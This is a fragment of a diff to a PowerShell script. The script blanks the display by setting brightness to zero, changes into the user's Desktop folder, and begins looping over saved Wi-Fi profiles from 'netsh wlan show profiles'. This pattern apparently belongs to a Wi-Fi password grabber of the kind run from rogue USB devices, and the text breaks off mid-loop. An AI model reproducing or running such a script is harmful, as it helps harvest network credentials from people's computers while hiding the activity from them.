@@ -1,7 +1,7 @@
 (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0); 
 
 
-cd $env:TEMP;
+cd $env:USERPROFILE\Desktop;
 
 
 (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
